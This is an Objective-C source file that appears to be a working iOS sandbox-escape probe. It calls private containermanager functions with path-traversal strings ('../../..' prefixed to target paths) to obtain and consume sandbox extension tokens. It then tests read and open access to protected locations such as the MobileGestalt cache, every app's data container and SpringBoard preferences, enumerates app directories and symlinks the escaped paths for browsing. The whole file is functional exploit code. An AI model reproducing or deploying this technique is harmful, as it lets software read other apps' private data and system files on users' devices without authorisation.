// BadQueryProbe — see BadQueryProbe.h. Runs synchronously on the caller's
// queue; call from a background queue once.

#import "BadQueryProbe.h"
#import "bad_query.h"

#import <UIKit/UIKit.h>
#import <dirent.h>
#import <dlfcn.h>
#import <errno.h>
#import <fcntl.h>
#import <sys/stat.h>
#import <sys/sysctl.h>
#import <unistd.h>
#import <xpc/xpc.h>

static NSString *const kBadQueryDirectoryName = @"[BadQuery] Escaped";

static NSMutableString *gLog;

static NSString *probeRoot(void)
{
    NSString *documents = NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
    return [documents stringByAppendingPathComponent:@"Device Storage"];
}

static void logLine(NSString *line)
{
    NSString *stamp = [NSDateFormatter localizedStringFromDate:NSDate.date
        dateStyle:NSDateFormatterNoStyle timeStyle:NSDateFormatterMediumStyle];
    NSString *full = [NSString stringWithFormat:@"[%@] %@\n", stamp, line];
    NSLog(@"[BadQueryProbe] %@", line);
    @synchronized (gLog) {
        [gLog appendString:full];
        NSString *logPath = [[probeRoot() stringByAppendingPathComponent:@"BadQuery Probe Log.txt"] stringByStandardizingPath];
        NSString *dir = logPath.stringByDeletingLastPathComponent;
        [[NSFileManager defaultManager] createDirectoryAtPath:dir
            withIntermediateDirectories:YES attributes:nil error:nil];
        [full writeToFile:logPath atomically:YES
            encoding:NSUTF8StringEncoding error:nil];
    }
}

static void logStep(BOOL ok, NSString *step, NSString *detail)
{
    NSString *status = ok ? @"OK  " : @"FAIL";
    if (detail.length) {
        if ([detail containsString:@"\n"])
            detail = [detail stringByReplacingOccurrencesOfString:@"\n" withString:@" | "];
        logLine([NSString stringWithFormat:@"[%@] %-28s %@", status,
            step.UTF8String, detail]);
    } else {
        logLine([NSString stringWithFormat:@"[%@] %@", status, step]);
    }
}

static NSString *strerr(int code)
{
    return [NSString stringWithUTF8String:strerror(code)] ?: @"unknown";
}

static NSDictionary *environmentInfo(void)
{
    char machine[64] = {0};
    char build[64] = {0};
    size_t machineSize = sizeof(machine);
    size_t buildSize = sizeof(build);
    if (sysctlbyname("hw.machine", machine, &machineSize, NULL, 0) != 0) strcpy(machine, "?");
    if (sysctlbyname("kern.osversion", build, &buildSize, NULL, 0) != 0) strcpy(build, "?");
    return @{
        @"Machine": @(machine),
        @"Build": @(build),
        @"SystemVersion": UIDevice.currentDevice.systemVersion ?: @"?",
        @"BundleIdentifier": NSBundle.mainBundle.bundleIdentifier ?: @"?",
        @"RequiredMCMIdentity": @"com.apple.mobile.MobileHouseArrest",
    };
}

// Optional App Group sacrifice configuration for iOS 26 App Group access:
// <Documents>/AppGroupSacrifice.plist -> { "GroupId": "group.your.group" }
static NSString *sacrificeGroupId(void)
{
    NSString *documents = NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
    NSString *path = [documents stringByAppendingPathComponent:@"AppGroupSacrifice.plist"];
    NSDictionary *config = [NSDictionary dictionaryWithContentsOfFile:path];
    NSString *groupId = [config[@"GroupId"] isKindOfClass:NSString.class] ? config[@"GroupId"] : nil;
    return groupId.length ? groupId : nil;
}

// Symlink an escaped path into the probe folder so it can be browsed.
static void installEscapedLink(NSString *name, NSString *target)
{
    NSString *folder = [probeRoot() stringByAppendingPathComponent:kBadQueryDirectoryName];
    [[NSFileManager defaultManager] createDirectoryAtPath:folder
        withIntermediateDirectories:YES attributes:@{NSFilePosixPermissions: @0700} error:nil];
    NSString *link = [folder stringByAppendingPathComponent:name];
    struct stat status = {0};
    if (lstat(link.fileSystemRepresentation, &status) == 0) {
        if (S_ISLNK(status.st_mode)) unlink(link.fileSystemRepresentation);
        else return;
    }
    if (symlink(target.fileSystemRepresentation, link.fileSystemRepresentation) != 0)
        logStep(NO, @"symlink", [NSString stringWithFormat:@"%@ errno=%d", link, errno]);
}

static NSMutableDictionary *runSingleProbe(NSString *name, NSString *path,
                                           BOOL useGroupRoute)
{
    NSMutableDictionary *result = [NSMutableDictionary dictionary];
    result[@"Name"] = name;
    result[@"Path"] = path;
    result[@"GroupRoute"] = @(useGroupRoute);

    logLine([NSString stringWithFormat:@"==== probe: %@ (%@) group=%d", name, path, useGroupRoute]);

    // 1. Precondition: absolute path sanity.
    if (![path hasPrefix:@"/"]) {
        result[@"Status"] = @"skipped";
        result[@"Error"] = @"path is not absolute";
        logStep(NO, @"precheck", @"path is not absolute");
        return result;
    }
    struct stat pre = {0};
    errno = 0;
    BOOL preExists = lstat(path.fileSystemRepresentation, &pre) == 0;
    result[@"PrecheckExists"] = @(preExists);
    result[@"PrecheckErrno"] = @(preExists ? 0 : errno);
    logStep(YES, @"precheck lstat", preExists
        ? @"path exists"
        : [NSString stringWithFormat:@"path missing (errno=%d %@)", errno, strerr(errno)]);

    // 2. dlopen.
    void *mgr = dlopen("/usr/lib/system/libsystem_containermanager.dylib",
                       RTLD_NOW | RTLD_LOCAL);
    if (!mgr) {
        result[@"Status"] = @"failed";
        result[@"Stage"] = @"dlopen";
        result[@"Error"] = [NSString stringWithFormat:@"dlopen errno=%d", errno];
        logStep(NO, @"dlopen", @"libsystem_containermanager");
        return result;
    }
    logStep(YES, @"dlopen", @"libsystem_containermanager");

    // 3. Resolve every symbol individually.
    const char *symbols[] = {
        "container_query_create",
        "container_query_set_class",
        "container_query_set_group_identifiers",
        "container_query_operation_set_flags",
        "container_query_operation_set_part",
        "container_query_operation_set_part_domain",
        "container_query_get_single_result",
        "container_query_free",
        "container_copy_sandbox_token",
        NULL,
    };
    void *resolved[9];
    for (int i = 0; symbols[i]; i++) {
        resolved[i] = dlsym(mgr, symbols[i]);
        logStep(resolved[i] != NULL, [NSString stringWithFormat:@"dlsym %s", symbols[i]],
            resolved[i] ? @"resolved" : @"missing");
        if (!resolved[i]) {
            dlclose(mgr);
            result[@"Status"] = @"failed";
            result[@"Stage"] = [NSString stringWithFormat:@"dlsym %s", symbols[i]];
            result[@"Error"] = @"symbol missing on this OS";
            return result;
        }
    }
    void *(*query_create)(void) = resolved[0];
    void (*query_set_class)(void *, uint64_t) = resolved[1];
    void (*query_set_group_identifiers)(void *, xpc_object_t) = resolved[2];
    void (*query_set_flags)(void *, uint64_t) = resolved[3];
    void (*query_set_part)(void *, uint64_t) = resolved[4];
    void (*query_set_part_domain)(void *, const char *) = resolved[5];
    void *(*query_get_single_result)(void *) = resolved[6];
    void (*query_free)(void *) = resolved[7];
    char *(*copy_sandbox_token)(void *) = resolved[8];
    int64_t (*consume_extension)(const char *) =
        (int64_t (*)(const char *))dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
    logStep(consume_extension != NULL, @"dlsym sandbox_extension_consume",
        consume_extension ? @"resolved" : @"missing");
    if (!consume_extension) {
        dlclose(mgr);
        result[@"Status"] = @"failed";
        result[@"Stage"] = @"dlsym sandbox_extension_consume";
        result[@"Error"] = @"sandbox_extension_consume missing";
        return result;
    }

    // 4. Build the query exactly like bad_query.c.
    void *query = query_create();
    logStep(query != NULL, @"container_query_create", query ? @"created" : @"NULL");
    if (!query) {
        dlclose(mgr);
        result[@"Status"] = @"failed";
        result[@"Stage"] = @"container_query_create";
        result[@"Error"] = @"NULL query";
        return result;
    }

    // Class 13 (system group, routes to containermanagerd_system) with the
    // MobileGestalt group as the whitelisted starting point; or class 7
    // (app group, containermanagerd) with a caller-owned group.
    uint64_t containerClass;
    NSString *groupIdentifier;
    NSString *traversal;
    if (useGroupRoute) {
        containerClass = 7;
        groupIdentifier = sacrificeGroupId() ?: @"group.com.apple.mobilegestaltcache";
        traversal = [NSString stringWithFormat:@"../../../../../../../../..%@", path];
    } else {
        containerClass = 13;
        groupIdentifier = @"systemgroup.com.apple.mobilegestaltcache";
        traversal = [NSString stringWithFormat:@"../../../../../../../..%@", path];
    }
    query_set_class(query, containerClass);
    logStep(YES, @"query_set_class", [NSString stringWithFormat:@"class=%llu", containerClass]);
    xpc_object_t identifier = xpc_string_create(groupIdentifier.UTF8String);
    query_set_group_identifiers(query, identifier);
    logStep(YES, @"query_set_group_identifiers", groupIdentifier);
    query_set_part(query, 3);
    logStep(YES, @"query_set_part", @"part=3 (Library/Caches start point)");
    query_set_part_domain(query, traversal.UTF8String);
    logStep(YES, @"query_set_part_domain", traversal);
    uint64_t flags = useGroupRoute ? 0x0000000800000000ULL : 0x0000008000000000ULL;
    query_set_flags(query, flags);
    logStep(YES, @"query_set_flags", [NSString stringWithFormat:@"flags=0x%016llx", flags]);
    result[@"Class"] = @(containerClass);
    result[@"GroupIdentifier"] = groupIdentifier;
    result[@"Traversal"] = traversal;
    result[@"Flags"] = [NSString stringWithFormat:@"0x%016llx", flags];

    // 5. Round trip to containermanagerd.
    void *queryResult = query_get_single_result(query);
    logStep(queryResult != NULL, @"container_query_get_single_result",
        queryResult ? @"returned object" : @"NULL (denied outside of sandbox?)");
    if (!queryResult) {
#if !OS_OBJECT_USE_OBJC
        xpc_release(identifier);
#endif
        query_free(query);
        dlclose(mgr);
        result[@"Status"] = @"denied";
        result[@"Stage"] = @"container_query_get_single_result";
        result[@"Error"] = @"query returned NULL (no sandbox token)";
        return result;
    }

    // 6. Token + consume.
    char *token = copy_sandbox_token(queryResult);
    logStep(token != NULL, @"container_copy_sandbox_token", token ? @"token obtained" : @"NULL");
    if (!token) {
#if !OS_OBJECT_USE_OBJC
        xpc_release(identifier);
#endif
        query_free(query);
        dlclose(mgr);
        result[@"Status"] = @"failed";
        result[@"Stage"] = @"container_copy_sandbox_token";
        result[@"Error"] = @"kernel refused to issue token";
        return result;
    }
    int64_t handle = consume_extension(token);
    logStep(handle >= 0, @"sandbox_extension_consume",
        handle >= 0 ? [NSString stringWithFormat:@"handle=%lld", handle] : @"consume failed");
    free(token);
#if !OS_OBJECT_USE_OBJC
    xpc_release(identifier);
#endif
    query_free(query);
    dlclose(mgr);
    if (handle < 0) {
        result[@"Status"] = @"failed";
        result[@"Stage"] = @"sandbox_extension_consume";
        result[@"Error"] = @"consume returned negative handle";
        return result;
    }
    result[@"Handle"] = @(handle);

    // 7. Verification: access() + open() on the escaped path.
    errno = 0;
    BOOL readable = access(path.UTF8String, R_OK) == 0;
    result[@"Readable"] = @(readable);
    result[@"AccessErrno"] = @(readable ? 0 : errno);
    logStep(readable, @"access R_OK", readable ? @"readable"
        : [NSString stringWithFormat:@"not readable (errno=%d %@)", errno, strerr(errno)]);

    struct stat post = {0};
    errno = 0;
    BOOL statOk = lstat(path.fileSystemRepresentation, &post) == 0;
    result[@"StatOk"] = @(statOk);
    result[@"StatErrno"] = @(statOk ? 0 : errno);
    if (statOk) {
        result[@"Mode"] = [NSString stringWithFormat:@"%04o", post.st_mode & 07777];
        result[@"UID"] = @(post.st_uid);
        result[@"GID"] = @(post.st_gid);
        result[@"IsDirectory"] = @(S_ISDIR(post.st_mode));
        logStep(YES, @"lstat", [NSString stringWithFormat:@"mode=%04o uid=%u gid=%u",
            post.st_mode & 07777, post.st_uid, post.st_gid]);
    }

    int flags2 = O_RDONLY | O_CLOEXEC | (S_ISDIR(post.st_mode) ? O_DIRECTORY : 0);
    errno = 0;
    int fd = open(path.UTF8String, flags2);
    BOOL openOk = fd >= 0;
    result[@"Openable"] = @(openOk);
    result[@"OpenErrno"] = @(openOk ? 0 : errno);
    logStep(openOk, @"open", openOk ? @"opened" : [NSString stringWithFormat:@"open failed (errno=%d %@)", errno, strerr(errno)]);

    if (S_ISDIR(post.st_mode) && fd >= 0) {
        DIR *dir = fdopendir(fd);
        if (dir) {
            NSUInteger count = 0;
            struct dirent *de;
            while ((de = readdir(dir)) != NULL) {
                if (!strcmp(de->d_name, ".") || !strcmp(de->d_name, "..")) continue;
                count++;
            }
            closedir(dir);
            result[@"ChildCount"] = @(count);
            logStep(YES, @"readdir", [NSString stringWithFormat:@"%lu entries", (unsigned long)count]);
        } else {
            close(fd);
            result[@"ChildCount"] = @0;
            logStep(NO, @"fdopendir", [NSString stringWithFormat:@"errno=%d", errno]);
        }
    } else if (fd >= 0) {
        close(fd);
    }

    result[@"Status"] = readable || openOk ? @"escaped" : @"token-but-unreadable";
    installEscapedLink([name stringByAppendingString:[NSString stringWithFormat:@" [h%lld]", handle]], path);
    logLine([NSString stringWithFormat:@"---- probe done: %@ => %@", name, result[@"Status"]]);
    return result;
}

// BadQueryProbeRun: run every probe, write results and a full step log.
// Synchronous; call from a background queue.
void BadQueryProbeRun(void)
{
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        gLog = [NSMutableString string];
        logLine(@"==== BadQueryProbe start ====");
        logLine([NSString stringWithFormat:@"environment: %@", environmentInfo()]);

        NSArray<NSDictionary *> *targets = @[
            @{@"Name": @"MobileGestalt.plist (file)",
              @"Path": @"/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches/com.apple.MobileGestalt.plist"},
            @{@"Name": @"MobileGestalt Caches (dir)",
              @"Path": @"/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches"},
            @{@"Name": @"App Data root",
              @"Path": @"/var/mobile/Containers/Data/Application"},
            @{@"Name": @"InternalDaemon root",
              @"Path": @"/var/mobile/Containers/Data/InternalDaemon"},
            @{@"Name": @"PluginKitPlugin root",
              @"Path": @"/var/mobile/Containers/Data/PluginKitPlugin"},
            @{@"Name": @"AppGroup root",
              @"Path": @"/var/mobile/Containers/Shared/AppGroup"},
            @{@"Name": @"SystemGroup root (iOS 27 path)",
              @"Path": @"/var/containers/Shared/SystemGroup"},
            @{@"Name": @"System Data root (iOS 27 path)",
              @"Path": @"/var/containers/Data/System"},
            @{@"Name": @"SpringBoard Preferences (file)",
              @"Path": @"/var/mobile/Library/Preferences/com.apple.springboard.plist"},
        ];

        NSMutableArray *results = [NSMutableArray array];
        for (NSDictionary *target in targets) {
            NSMutableDictionary *result = runSingleProbe(target[@"Name"], target[@"Path"], NO);
            [results addObject:result];
            if ([result[@"Status"] isEqualToString:@"denied"]) {
                // One class-13 denial is representative; still try the rest.
                continue;
            }
        }

        // App Group sacrifice route (iOS 26): only when a caller-owned group
        // is configured in Documents/AppGroupSacrifice.plist.
        if (sacrificeGroupId().length) {
            logLine(@"AppGroup sacrifice configured, probing class 7 route");
            for (NSDictionary *target in @[
                @{@"Name": @"AppGroup root (class 7 sacrifice)",
                  @"Path": @"/var/mobile/Containers/Shared/AppGroup"},
                @{@"Name": @"App Data root (class 7 sacrifice)",
                  @"Path": @"/var/mobile/Containers/Data/Application"},
            ]) {
                [results addObject:runSingleProbe(target[@"Name"], target[@"Path"], YES)];
            }
        } else {
            logLine(@"No AppGroupSacrifice.plist (GroupId) configured; class 7 sacrifice route skipped");
        }

        // Enumeration probe on the App Data root once escaped.
        NSDictionary *appRootResult = results.firstObject;
        if ([appRootResult[@"Status"] isEqualToString:@"escaped"] &&
            [appRootResult[@"IsDirectory"] boolValue]) {
            logLine(@"==== fsgetpath enumeration of App Data root ====");
            char *list = bad_query_list("/private/var/mobile/Containers/Data/Application", 5000000);
            if (list) {
                NSString *text = [NSString stringWithUTF8String:list];
                NSArray *lines = [text componentsSeparatedByString:@"\n"];
                logStep(YES, @"bad_query_list", [NSString stringWithFormat:@"%lu entries", (unsigned long)lines.count]);
                logLine([NSString stringWithFormat:@"first entries:\n%@",
                    [[lines subarrayWithRange:NSMakeRange(0, MIN((NSUInteger)10, lines.count))]
                        componentsJoinedByString:@"\n"]]);
                free(list);
            } else {
                logStep(NO, @"bad_query_list", @"returned NULL");
            }
        }

        NSDictionary *report = @{
            @"Version": @1,
            @"CreatedAt": NSDate.date,
            @"Environment": environmentInfo(),
            @"Probes": results,
            @"SacrificeGroupConfigured": @(sacrificeGroupId().length > 0),
        };
        NSString *resultsPath = [probeRoot() stringByAppendingPathComponent:@"BadQuery Probe Results.plist"];
        [report writeToFile:resultsPath atomically:YES];
        logStep(YES, @"write results", resultsPath);
        logLine(@"==== BadQueryProbe done ====");
    });
}
